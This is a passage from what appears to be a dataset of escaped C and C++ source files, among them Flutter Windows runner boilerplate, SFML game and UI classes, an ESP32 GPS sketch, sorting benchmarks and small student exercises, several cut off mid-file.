true;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tvalid = false;\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tvalid = true; // set flag to true to exit loop\n\t\t}\n\t} while (!valid);\n\n\tmpg = calcMPG(gallons, MILES);\n\n\tcout << fixed << setprecision(2);\n\tcout << endl << \"During the 500 mile drive, the \" << carMake << \"'s fuel efficiency was \" << mpg << \" miles per gallon.\" << endl;\n\n\treturn 0;\n}\n\ndouble calcMPG(double gallons, double miles)\n{\n\treturn miles / gallons;\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\nusing namespace std;\n\nint main() {\n    int a[10][10], transpose[10][10], row, column, i, j;\n\n    cout << \"Enter rows and columns of matrix: \";\n    cin >> row >> column;\n\n    cout << \"\\nEnter elements of matrix: \" << endl;\n\n    // Storing matrix elements\n    for (int i = 0; i < row; ++i) {\n        for (int j = 0; j < column; ++j) {\n            cout << \"Enter element a\" << i + 1 << j + 1 << \": \";\n            cin >> a[i][j];\n        }\n    }\n\n    // Printing the a matrix\n    cout << \"\\nEntered Matrix: \" << endl;\n    for (int i = 0; i < row; ++i) {\n        for (int j = 0; j < column; ++j) {\n            cout << \" \" << a[i][j];\n            if (j == column - 1)\n                cout << endl << endl;\n        }\n    }\n\n    // Computing transpose of the matrix\n    for (int i = 0; i < row; ++i)\n        for (int j = 0; j < column; ++j) {\n            transpose[j][i] = a[i][j];\n        }\n\n    // Printing the transpose\n    cout << \"\\nTranspose of Matrix: \" << endl;\n    for (int i = 0; i < column; ++i)\n        for (int j = 0; j < row; ++j) {\n            cout << \" \" << transpose[i][j];\n            if (j == row - 1)\n                cout << endl << endl;\n        }\n\n    return 0;\n}",
    "#include <iostream>\r\nusing namespace std;\r\n#include <string>\r\n#include<vector>\r\n\r\n// Idea is Creating a family tree using a single linked list from head to bottom\r\n\r\nclass Person{\r\n    public: //must specify otherwise default private\r\n    string _name;\r\n    vector<Person*> _children={}; //list of pointers not objects so if one object changes the change is reflected when accessing the pointer instead of ending up with 2 different objects in memory originating from 1 object change.\r\n\r\n    Person(string name){_name=name;}\r\n\r\n    void NullPtrCheck(){\r\n        if (this == nullptr){\r\n            cout<<\"Error: Cannot perform action on Nullptr\\n\";\r\n            return;\r\n        }\r\n    }\r\n\r\n    #pragma region adders\r\n    void addChild(Person* p){\r\n        NullPtrCheck();\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else\r\n            _children.push_back(p);\r\n        }\r\n\r\n    void addChild(string name){\r\n        // if (this == nullptr)\r\n        //     cout<<\"Error: Cannot add child to Nullptr\\n\";\r\n        // else{\r\n        NullPtrCheck();\r\n        Person* p = new Person(name);\r\n        _children.push_back(p);\r\n        // }\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region Printers\r\n    void PrintChildren(){ //this could also be outside of Class in the form of PrintChildren(Person* p) since no private var access needed\r\n        cout<<\"Children of \"<<this->returnName()<<\": \";\r\n        \r\n        //print first child, seperated from loop just for the sake of output format not ending with a \",\"\r\n        if (_children.size()>=1)\r\n            cout<<_children[0]->returnName();\r\n\r\n        for (int i = 1; i < _children.size(); i++)\r\n        {\r\n            cout<<\", \";\r\n            cout<<_children[i]->returnName();\r\n        }\r\n        cout<<\"\\n\";\r\n    }\r\n    #pragma endregion\r\n\r\n    #pragma region getters\r\n    string returnName(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST PRINT this->name\r\n        if (this != nullptr) {\r\n            return this->_name;\r\n        } else {\r\n            return \"NAN\";\r\n        }\r\n    }\r\n\r\n    vector<Person*> returnChildren(){ //NOTE: SINCE CAN BE nullptr, CANNOT JUST USE this->_children\r\n        if (this != nullptr) {\r\n            return this->_children;\r\n        } else {\r\n            return {};\r\n        }\r\n    }\r\n\r\n    Person* getChild(string name){ //BFS same as isChild, just return object instead of bool\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return p;\r\n        }\r\n        return nullptr;\r\n    }\r\n\r\n    // Person* getNthChild(string name){ //BFS or DFS to see if a person if part of the parent's lineage\r\n    //     while (this->returnChildren() != {}){\r\n\r\n    //     }\r\n    //     return nullptr;\r\n    // }\r\n\r\n    // Person* getParent(Person* head){ //get Parent of specific entity. Need to start from head since it's single linked list\r\n    //     if (this == head) //cannot be parent if you are yourself the root. If you're not the root then you must be someone's child\r\n    //         return nullptr;\r\n\r\n    //     Person* p = head;\r\n    //     while (p->returnChildren()!={})\r\n    //     {\r\n    //         if(p->isChild(this->returnName())) //if i am the child of the current entity, then this entity is my parent\r\n    //             return p;\r\n    //     }\r\n    // }\r\n    #pragma endregion\r\n\r\n    #pragma region checkers\r\n    bool isChild(string name){ //O(n). BFS :) same as getChild, just return bool instead of object\r\n        for (Person* p : this->returnChildren()){\r\n            if (p->returnName() == name)\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    bool isGrandChild(string name){//use isChild. DFS, O(n^2)\r\n        for (Person* p : this->returnChildren()){ //for every child of this entity\r\n            if (p->isChild(name)) //check if input is a child of the child iterated\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    // bool isNthChild(string name, int n){ //DFS recursion of isChild\r\n    //     return false;\r\n    // } \r\n    #pragma endregion\r\n};\r\n\r\n#pragma region global functions\r\n//no need for it to be in Class (part of object) since no private var access needed. If in Class, it would be in the same format as PrintChildren\r\nvoid PrintTree(Person* head){ //BFS, should use PrintChildren\r\n    cout<<head->returnName()<<\": \";\r\n    // Person *p = head;\r\n    // While p.children is not empty{\r\n    //     cout<<p->name<<\", \";\r\n    // }\r\n    cout<<\"\\n\";\r\n}\r\n\r\nPerson* getPerson(Person* head, string name){ //BFS or DFS to see if a person is part of tree\r\n        if (head->returnName() ==name)\r\n            return head;\r\n\r\n        // while (this->returnChildren() != {}){\r\n\r\n        // }\r\n        return nullptr;\r\n    }\r\n\r\nbool Exists(Person *head, string name){\r\n    if (getPerson(head, name) ==nullptr)\r\n        return false;\r\n    return true;\r\n}\r\n#pragma endregion\r\n\r\nint main(){\r\n    //creating family tree ahmad->ali->edy\r\n ",
    "#include <SFML/Graphics.hpp>\n#include <SFML/Window/Mouse.hpp>\n#include <stdio.h>\n#include <string>\n#include \"SUI.h\"\n\n//Button Class\nSUI::Button::Button(sf::Vector2f size, sf::Vector2f pos)\n{\n\tbtn.setSize(size);\n\tbtn.setPosition(pos);\n}\nstd::string SUI::Button::getTextString()\n{\n\treturn text.getString();\n}\nvoid SUI::Button::setFont(sf::Font& font)\n{\n\ttext.setFont(font);\n}\nvoid SUI::Button::setTextString(std::string str)\n{\n\ttext.setString(str);\n}\nvoid SUI::Button::setPosition(sf::Vector2f pos)\n{\n\tbtn.setPosition(pos);\n}\nvoid SUI::Button::setColor(sf::Color col)\n{\n\tbtn.setFillColor(col);\n}\nvoid SUI::Button::setTextColor(sf::Color col)\n{\n\ttext.setFillColor(col);\n}\nvoid SUI::Button::centerText()\n{\n\tfloat xPos = btn.getPosition().x + (btn.getLocalBounds().width / 2) - (text.getGlobalBounds().width/2);\n\tfloat yPos = btn.getPosition().y + (btn.getLocalBounds().height / 2) - (text.getGlobalBounds().height / 2);\n\ttext.setPosition(xPos, yPos);\n}\nbool SUI::Button::isHovered(sf::RenderWindow& window)\n{\n\tfloat mPosX = sf::Mouse::getPosition(window).x;\n\tfloat mPosY = sf::Mouse::getPosition(window).y;\n\t//if mouse is within button coordinates\n\tif (mPosX > btn.getPosition().x && mPosX <= btn.getPosition().x + btn.getLocalBounds().width && \n\tmPosY > btn.getPosition().y && mPosY <= btn.getPosition().y + btn.getLocalBounds().height)\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\nvoid SUI::Button::drawTo(sf::RenderWindow& window)\n{\n\twindow.draw(btn);\n\tcenterText();\n\twindow.draw(text);\n}\n",
    "\r\n#include <TinyGPSPlus.h>\r\n#include <HardwareSerial.h>\r\n\r\nHardwareSerial SerialPort(1); // use UART1\r\n\r\nTinyGPSPlus gps;\r\n\r\n\r\nvoid displayInfo()\r\n{\r\n  Serial.print(F(\"Location: \")); \r\n  if (gps.location.isValid())\r\n  {\r\n    Serial.print(gps.location.lat(), 6);\r\n    Serial.print(F(\",\"));\r\n    Serial.print(gps.location.lng(), 6);\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\"  Date/Time: \"));\r\n  if (gps.date.isValid())\r\n  {\r\n    Serial.print(gps.date.month());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.day());\r\n    Serial.print(F(\"/\"));\r\n    Serial.print(gps.date.year());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.print(F(\" \"));\r\n  if (gps.time.isValid())\r\n  {\r\n    if (gps.time.hour() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.hour());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.minute() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.minute());\r\n    Serial.print(F(\":\"));\r\n    if (gps.time.second() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.second());\r\n    Serial.print(F(\".\"));\r\n    if (gps.time.centisecond() < 10) Serial.print(F(\"0\"));\r\n    Serial.print(gps.time.centisecond());\r\n  }\r\n  else\r\n  {\r\n    Serial.print(F(\"INVALID\"));\r\n  }\r\n\r\n  Serial.println();\r\n}\r\n\r\nvoid setup()\r\n{\r\n  Serial.begin(115200);\r\n  SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n\r\n  while(!Serial);\r\n    Serial.println(\"Initializing\");\r\n\r\n  \r\n  delay(5000);\r\n  Serial.println(\"Test\");\r\n\r\n  SerialPort.println(\"$PMTK314,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0*29<CR><LF>\");\r\n\r\n  SerialPort.println(\"$PMTK220,100*2F<CR><LF>\");\r\n  //SerialPort.println(\"$PMTK251,115200*1F<CR><LF>\");\r\n\r\n  //SerialPort.begin(9600, SERIAL_8N1, 9, 10); \r\n  \r\n}\r\n\r\nvoid loop()\r\n{\r\n  // This sketch displays information every time a new sentence is correctly encoded.\r\n  while (SerialPort.available() > 0)\r\n    Serial.print(char(SerialPort.read()));\r\n    /*gps.encode(SerialPort.read());\r\n\r\n    \r\n    Serial.print(\"LAT=\"); Serial.print(gps.location.lat(), 6);\r\n    Serial.print(\" \");\r\n    Serial.print(\"LNG=\"); Serial.println(gps.location.lng(), 6);\r\n    Serial.println(gps.time.value());\r\n    Serial.println(\"\");\r\n    delay(1000);*/\r\n    \r\n\r\n  /*if (millis() > 5000 && gps.charsProcessed() < 10)\r\n  {\r\n    Serial.println(F(\"No GPS detected: check wiring.\"));\r\n    while(true);\r\n  }*/\r\n}\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"first_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <SFML/Graphics.hpp>\n#include <SFML/Window.hpp>\n#include <SFML/System.hpp>\n#include <SFML/Audio.hpp>\n#include <SFML/Network.hpp>\n#include <iostream>\n#include <vector>\n#include <math.h>\n#include <cstdlib>\n#include <sstream>\n#include <fstream>\n#include <cmath>\n#include <string>\n#include <map>\n#include <stack>\n\n// LENGTH OF VECTOR: |V| = sqrt(V.x^2 + V.y^2)\n// NORMALIZE VECTOR: U = V / |V|\nusing namespace std;\nusing namespace sf;\n\nenum button_states\n{\n    BTN_IDLE = 0,\n    BTN_HOVER,\n    BTN_ACTIVE\n};\n\nenum movement_states\n{\n    IDLE = 0,\n    MOVING,\n    MOVING_LEFT,\n    MOVING_RIGHT,\n    MOVING_UP,\n    MOVING_DOWN\n};\nclass MovementComponent\n{ //============================  MovementComponent ====================================================\nprivate:\n    sf::Sprite *sprite;\n    float maxVelocity;\n    float acceleration;\n    float deceleration;\n\n    Vector2f velocity;\n\n    // initializer functions\n\npublic:\n    MovementComponent(sf::Sprite *sprit, float maxvelocity, float acceleration, float deceleration)\n        : sprite(sprit), maxVelocity(maxvelocity), acceleration(acceleration), deceleration(deceleration) {}\n    ~MovementComponent()\n    {\n    }\n    // Accessors\n    const float &getMaxVelocity() const\n    {\n        return this->maxVelocity;\n    }\n\n    const Vector2f &getVelocity() const\n    {\n        return this->velocity;\n    }\n\n    // functions\n\n    const bool getState(const short unsigned state) const\n    {\n        switch (state)\n        {\n        case IDLE:\n            if (this->velocity.x == 0.f && this->velocity.y == 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING:\n            if (this->velocity.x != 0.f && this->velocity.y != 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_LEFT:\n            if (this->velocity.x < 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_RIGHT:\n            if (this->velocity.x > 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_UP:\n            if (this->velocity.y < 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_DOWN:\n            if (this->velocity.y > 0.f)\n            {\n                return true;\n            }\n            break;\n        }\n\n        false;\n    }\n    return false;\n}\n\nvoid\nmove(const float dir_x, const float dir_y, const float &dt)\n{\n    // Assclerating  a sprite untile reaches the max velocity\n    // Accecleration\n\n    this->velocity.x += this->maxVelocity * dir_x;\n    this->velocity.y += this->maxVelocity * dir_y;\n}\nvoid update(const float &dt)\n{\n    // Decelerate the sprite and controls the mamximum velocity.\n    // moves the sprite.\n    if (this->velocity.y > 0.f)\n    {\n        // Chack Max vlecity of positive y\n        if (this->velocity.y > this->maxVelocity)\n            this->velocity.y = this->maxVelocity;\n\n        // deceleration Y positive\n        this->velocity.y -= deceleration;\n        if (this->velocity.y < 0.f)\n            this->velocity.y = 0.f;\n    }\n    else if (this->velocity.y < 0.f)\n    {\n        // Chack Max vlecity of negitive y\n\n        if (this->velocity.y < -this->maxVelocity)\n            this->velocity.y = -this->maxVelocity;\n\n        // deceleration Y -VE\n        this->velocity.y += deceleration;\n        if (this->velocity.y > 0.f)\n            this->velocity.y = 0.f;\n    }\n\n    if (this->velocity.x > 0.f)\n    {\n        // Chack Max vlecity of positive x\n        if (this->velocity.x > this->maxVelocity)\n            this->velocity.x = this->maxVelocity;\n\n        // deceleration X positive\n        this->velocity.x -= deceleration;\n        if (this->velocity.x < 0.f)\n            this->velocity.x = 0.f;\n    }\n    else if (this->velocity.x < 0.f)\n    {\n        // Chack Max vlecity of negitive\n        if (this->velocity.x < -this->maxVelocity)\n            this->velocity.x = -this->maxVelocity;\n\n        // deceleration x -VE\n        this->velocity.x += deceleration;\n        if (this->velocity.x > 0.f)\n            this->velocity.x = 0.f;\n    }\n\n    // Final move\n    this->sprite->move(this->velocity * dt); // use this->velocity * dt to make it move at the same speed on all computers\n}\n\n;\n\nclass AnimationComponent\n{ //===========================  ANIMATION COMPONENT  ================================================\nprivate:\n    class Animation\n    { //===============================  Animation  ============================================================\n    public:\n        // Varibles\n        Texture &textureSheet;\n        Sprite &sprite;\n        float animationTimer;\n        float timer;\n        bool done;\n        float width;\n        float height;\n        IntRect startRectSourceSprite; //(235,0,108.33,164.75)\n        IntRect currentReack;\n        IntRect endRectSourceSprite;\n\n        // Contructor / Distructor\n        Animation(Sprite &sprite, Texture &texturSheet, float an",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <vector>\n#include <algorithm>\nusing std::cout;\nusing std::endl;\nusing std::swap;\nusing std::sort;\n\nusing std::clock_t;\nconst int CLOCKS_PER_MS = CLOCKS_PER_SEC/1000; // clock per milliseconds\n\nconst int NUMBERS_SIZE = 50000;\n\n// random number in range -> for test code\nint genRandInt(int low, int high) {\n   return low + rand() % (high - low + 1);\n}\n\n// fill arrays -> for test code\nvoid fillArrays(int arr1[], int arr2[],int arr3[]) {\n  for(int i = 0; i < NUMBERS_SIZE; ++i){\n    arr1[i] = genRandInt(0,NUMBERS_SIZE);\n    arr2[i] = arr1[i];\n    arr3[i] = arr1[i];\n  }\n}\n\n// helper for quicksorts\nint QPartition(int numbers[], int low, int high, int pivotIndex) {\n  int pivot = numbers[pivotIndex];\n  while (true) {  // continuously loops until fin is true\n    // until reaches element left of pivot that is greater than pivot value\n    while (numbers[low] < pivot) { ++low; }\n    // until reaches element right of pivot that is less than pivot value\n    while (pivot < numbers[high]) { --high; }\n    if (low >= high) break;  // checks if there are unsorted elements\n    // if continues, low index is still less than high index\n    swap(numbers[low], numbers[high]);\n    ++low;\n    --high;\n  }\n  return high;\n}\n\n// sorts given array in range using quicksort method, recursive\nvoid Quicksort_midpoint(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  mid = QPartition(numbers, low, high, mid);  // call helper\n  Quicksort_midpoint(numbers, low, mid);  // left half recursive call\n  Quicksort_midpoint(numbers, mid + 1, high); // right half recursive call\n}\n\n// sort given array in range using quicksort method, but chooses pivot by\n// choosing middle value of low, middle, and high indexes, recursive\nvoid Quicksort_medianOfThree(int numbers[], int low, int high) {\n  if (low >= high) return;  // already sorted\n  int mid = (high - low) / 2 + low;\n  int pivot = mid;  // element at mid is pivot by default\n  // element at lowest index is middle value\n  if ((numbers[mid] < numbers[low] && numbers[low] < numbers[high]) ||\n      (numbers[high] < numbers[low] && numbers[low] < numbers[mid])) pivot = low;\n  // element at highest index is middle value\n  if ((numbers[mid] < numbers[high] && numbers[high] < numbers[low]) ||\n      (numbers[low] < numbers[high] && numbers[high] < numbers[mid])) pivot = high;\n  mid = QPartition(numbers, low, high, pivot);  // call helper\n  Quicksort_medianOfThree(numbers, low, mid); // left half recursive call\n  Quicksort_medianOfThree(numbers, mid + 1, high);  // right half recursive call\n}\n\n// sorts given array using insertion sort method\nvoid InsertionSort(int numbers[], int numbersSize) {\n  for (int i = 1; i < numbersSize; ++i) { // sorts every element in array\n    int j = i;\n    // shifts element left to correct spot\n    while (j > 0 && numbers[j] < numbers[j - 1]) {\n      swap(numbers[j], numbers[j - 1]);\n      --j;\n    }\n  }\n}\n\n// helper, returns true if sorted, else false\nstatic bool is_sorted(int numbers[], int numbersSize) {\n  if (numbersSize <= 0) return true;  // will be sorted if empty\n  int last = numbers[0];\n  for(int i=0; i < numbersSize; ++i) {  // checks all elements\n    int curr = numbers[i];\n    if (curr < last) return false;  // prev value is greater than curr -> not sorted properly\n    last = curr;\n  }\n  return true;\n}\n\n// put vector in array after randomizing in main\nstatic void copy_vector_into_array(const std::vector<int>& source, int array[]) {\n  for(int i=0;i<static_cast<int>(source.size()); ++i) { // iterate through vector\n    array[i] = source[i];\n  }\n}\n\nint main() {\n  std::vector<int> sample;\n  sample.reserve(NUMBERS_SIZE);\n  // randomize array\n  for(int i=0; i<NUMBERS_SIZE; ++i) {\n    sample.push_back(rand() % (NUMBERS_SIZE + 1));\n  }\n  \n  // run tests across different sizes\n  int test_sizes[4] = { 10, 100, 1000, 50000 };\n  int test_array[NUMBERS_SIZE];\n  for(int i=0; i<4; ++i) {  // loops for four different sizes\n    int size = test_sizes[i];\n    cout << endl;\n    cout << \"-------------------- size \" << size << \" --------------------\" << endl;\n\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_midpoint(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort midpoint is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // QUICKSORT MEDIAN OF THREE SORT\n    {\n      copy_vector_into_array(sample, test_array);\n      clock_t Start = clock();\n      Quicksort_medianOfThree(test_array, 0, size - 1);\n      clock_t End = clock();\n      int elapsedTime = (End - Start)/CLOCKS_PER_MS;\n      cout << elapsedTime << \" ms\" << endl;\n      cout << \"Quicksort median of three is \" << ((is_sorted(test_array,size))?\"GOOD\":\"BAD\") << endl;\n    }\n    \n    // INSERTION SORT\n    {\n      co",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if 